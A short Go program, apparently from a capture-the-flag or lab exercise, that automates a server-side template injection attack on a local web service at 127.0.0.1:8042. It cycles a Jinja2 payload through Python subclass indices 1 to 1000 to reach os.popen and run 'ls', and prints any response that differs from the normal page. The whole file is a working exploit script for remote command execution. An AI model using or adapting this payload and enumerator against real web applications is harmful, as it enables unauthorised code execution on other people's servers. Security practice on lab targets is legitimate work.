package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
)
var wg sync.WaitGroup
var urls string = "http://127.0.0.1:8042/UF1agS/?payload="
var payload1 string = "{{ [].__class__.__mro__[1].__subclasses__()["
var payload2 string ="].__init__.__globals__['__builtins__'].get('__import__')('os').popen('ls').read() }}"
var begin_num = 1

func go_payload(i *int){
	for ;*i<=1000;*i++{
		fmt.Println(*i)
		num := strconv.Itoa(*i)
		payload := urls+url.QueryEscape(payload1+num+payload2)
		req,err := http.Get(payload)
		if err != nil {
			fmt.Println(err)
		}
		html_text,err := ioutil.ReadAll(req.Body)
		if err!=nil {
			fmt.Println(err)
		}
		if strings.Contains(string(html_text),"right") {
			continue
		}else {
			fmt.Println(string(html_text))
		}
		//fmt.Println(string(html_text))
	}
	wg.Done()
}

func main(){
	for k :=0;k < 9;k++{
		wg.Add(1)
		go go_payload(&begin_num)
	}
	wg.Wait()
}
